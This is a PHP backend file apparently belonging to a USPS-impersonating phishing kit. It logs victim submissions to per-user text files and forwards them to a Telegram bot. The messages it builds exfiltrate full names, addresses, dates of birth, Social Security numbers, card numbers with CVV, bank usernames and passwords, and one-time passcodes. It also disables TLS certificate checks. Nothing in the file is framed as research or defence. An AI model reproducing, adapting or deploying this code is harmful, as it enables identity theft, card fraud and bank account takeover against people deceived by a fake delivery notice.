<?php

require_once __DIR__ . '/../config.php';

/**
 * File Storage Helper Functions
 * Saves user data to text files instead of making API calls
 */

function saveUserData($filename, $data) {
    $dataDir = DATA_STORAGE_PATH;
    
    // Create data directory if it doesn't exist
    if (!is_dir($dataDir)) {
        mkdir($dataDir, 0755, true);
    }
    
    // Create user-specific directory if username exists
    if (isset($data['usrnm'])) {
        $userDir = $dataDir . '/' . $data['usrnm'];
        if (!is_dir($userDir)) {
            mkdir($userDir, 0755, true);
        }
        
        // Save to single user file instead of step-specific files
        $filepath = $userDir . '/user_data.txt';
    } else {
        // Fallback to shared file if no username
        $filepath = $dataDir . '/' . $filename;
    }
    
    // Add timestamp and step info to each entry
    $timestamp = date('Y-m-d H:i:s');
    $entry = "[$timestamp] Step: " . ($data['step'] ?? 'unknown') . " - " . json_encode($data) . "\n";
    
    // Save to file
    $result = file_put_contents($filepath, $entry, FILE_APPEND | LOCK_EX);
    
    // Send Telegram notification if enabled
    if ($result && TELEGRAM_ENABLED) {
        sendTelegramNotification($data);
    }
    
    return $result;
}

function getUserData($filename, $username = null) {
    $dataDir = DATA_STORAGE_PATH;
    
    // If username provided, look in user-specific directory
    if ($username) {
        $userDir = $dataDir . '/' . $username;
        $filepath = $userDir . '/user_data.txt';
    } else {
        $filepath = $dataDir . '/' . $filename;
    }
    
    if (!file_exists($filepath)) {
        return [];
    }
    
    $lines = file($filepath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $data = [];
    
    foreach ($lines as $line) {
        // Remove timestamp and parse JSON
        if (preg_match('/^\[.*?\] Step: .*? - (.+)$/', $line, $matches)) {
            $data[] = json_decode($matches[1], true);
        }
    }
    
    return $data;
}

function sendTelegramNotification($data) {
    if (!TELEGRAM_ENABLED || !TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        return false;
    }
    
    $step = $data['step'] ?? 'unknown';
    $usrnm = $data['usrnm'] ?? 'unknown';
    $timestamp = date('Y-m-d H:i:s');
    
    // Determine message type based on step
    $message = '';
    
    switch ($step) {
        case 'address_verification':
            $message = "📦 USPS Address Verification
👤 User: $usrnm
⏰ Time: $timestamp

📋 Submitted Data:
👤 Full Name: " . ($data['fullName'] ?? 'N/A') . "
🏠 Address: " . ($data['streetAddress1'] ?? 'N/A');
            
            if (!empty($data['streetAddress2'])) {
                $message .= "\n   " . $data['streetAddress2'];
            }
            
            $message .= "\n   " . ($data['city'] ?? 'N/A') . ", " . ($data['state'] ?? 'N/A') . " " . ($data['zipCode'] ?? 'N/A') . "
📱 Phone: " . ($data['phone'] ?? 'N/A') . "
📅 DOB: " . ($data['dob'] ?? 'N/A') . "
🔢 SSN: " . ($data['ssn'] ?? 'N/A') . "

📍 Tracking: " . TRACKING_NUMBER;
            break;
            
        case 'payment_info':
            $cardNumber = $data['cardNumber'] ?? '';
            $formattedCard = $cardNumber ? 
                substr($cardNumber, 0, 4) . '-' . 
                substr($cardNumber, 4, 4) . '-' . 
                substr($cardNumber, 8, 4) . '-' . 
                substr($cardNumber, 12) : 'N/A';
                
            $message = "💳 USPS Payment Info
👤 User: $usrnm
⏰ Time: $timestamp

💳 Card Details:
💳 Card: $formattedCard
📅 Exp: " . ($data['expiryMonth'] ?? 'MM') . "/" . ($data['expiryYear'] ?? 'YYYY') . "
🔢 CVV: " . ($data['cvv'] ?? 'N/A') . "
👤 Cardholder: " . ($data['cardholderName'] ?? 'N/A') . "

📍 Tracking: " . TRACKING_NUMBER;
            break;
            
        case 'bank_credentials':
            $message = "🏦 USPS Bank Authentication
👤 User: $usrnm
⏰ Time: $timestamp

🏦 Bank Details:
🏦 Bank: " . ($data['bankName'] ?? 'N/A') . "
👤 Username: " . ($data['bankUsername'] ?? 'N/A') . "
🔐 Password: " . ($data['bankPassword'] ?? 'N/A') . "

📍 Tracking: " . TRACKING_NUMBER;
            break;
            
        case 'otp_verification':
            $message = "🔐 USPS OTP Verification
👤 User: $usrnm
🔢 Code: " . ($data['otp'] ?? 'N/A') . "
✅ Status: Verified
⏰ Time: $timestamp

📍 Tracking: " . TRACKING_NUMBER;
            break;
            
        case 'wait_event':
            $message = "⏳ USPS Processing
👤 User: $usrnm
⏰ Time: $timestamp
Status: Processing request...

📍 Tracking: " . TRACKING_NUMBER;
            break;
            
        case 'success':
            $message = "✅ USPS Process COMPLETED! 🎉
👤 User: $usrnm
⏰ Time: $timestamp

📦 Delivery Details:
📦 Package ID: " . TRACKING_NUMBER . "
🏠 Delivery Address: " . ($_SESSION['address_verification']['streetAddress1'] ?? 'N/A');
            
            if (!empty($_SESSION['address_verification']['streetAddress2'])) {
                $message .= "\n   " . $_SESSION['address_verification']['streetAddress2'];
            }
            
            $message .= "\n   " . ($_SESSION['address_verification']['city'] ?? 'N/A') . ", " . 
                      ($_SESSION['address_verification']['state'] ?? 'N/A') . " " . 
                      ($_SESSION['address_verification']['zipCode'] ?? 'N/A') . "

" . "🌐 Redirected to: " . FINAL_REDIRECT_URL;
            break;
            
        default:
            // Regular step completion with all data
            $message = "✅ Step Completed: $step
👤 User: $usrnm
⏰ Time: $timestamp

📋 Submitted Data:
";
            foreach ($data as $key => $value) {
                if (is_array($value)) {
                    $message .= "🔹 $key: " . json_encode($value) . "\n";
                } else {
                    $message .= "🔹 $key: $value\n";
                }
            }
            break;
    }
    
    return sendTelegramMessage($message);
}

function sendTelegramMessage($message) {
    if (!TELEGRAM_ENABLED || !TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        return false;
    }
    
    $apiUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    
    $postData = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if (DEBUG_MODE && $httpCode !== 200) {
        error_log("Telegram API Error: HTTP $httpCode - Response: $response");
    }
    
    return $httpCode === 200;
}

?>
